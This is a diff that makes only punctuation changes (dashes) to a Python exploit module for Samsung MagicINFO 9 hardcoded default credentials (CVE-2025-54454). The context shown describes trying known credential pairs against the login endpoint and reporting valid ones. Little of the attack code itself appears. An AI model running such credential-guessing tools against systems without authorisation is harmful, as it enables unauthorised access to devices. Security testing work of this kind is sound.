@@ -1,5 +1,5 @@
 # Author: André Henrique (LinkedIn/X: @mrhenrike)
-"""Samsung MagicINFO 9 — Hardcoded Default Credentials (CVE-2025-54454).
+"""Samsung MagicINFO 9  -  Hardcoded Default Credentials (CVE-2025-54454).
 
 Attempts to authenticate to the MagicINFO 9 login endpoint using a list of
 well-known default and hardcoded credential pairs. Reports any pair that
@@ -75,7 +75,7 @@ def _login_succeeded(body: str, status: int) -> bool:
 
 
 class Exploit(HTTPClient):
-    """Samsung MagicINFO 9 Hardcoded Default Credentials — CVE-2025-54454.
+    """Samsung MagicINFO 9 Hardcoded Default Credentials  -  CVE-2025-54454.
 
     MagicINFO 9 installations ship with several hardcoded and well-known
     default credential pairs that are frequently left unchanged. This module
@@ -119,17 +119,17 @@ class Exploit(HTTPClient):
             if result:
                 found = True
                 print_success(
-                    "VALID CREDENTIALS — {}:{} succeeded at {}".format(
+                    "VALID CREDENTIALS  -  {}:{} succeeded at {}".format(
                         username, password, result
                     )
                 )
             else:
                 print_status(
-                    "  {}:{} — no match".format(username, password)
+                    "  {}:{}  -  no match".format(username, password)
                 )
         if not found:
             print_error(
-                "All default credential attempts failed — target may use "
+                "All default credential attempts failed  -  target may use "
                 "a non-default password or CVE-2025-54454 is patched."
             )
 
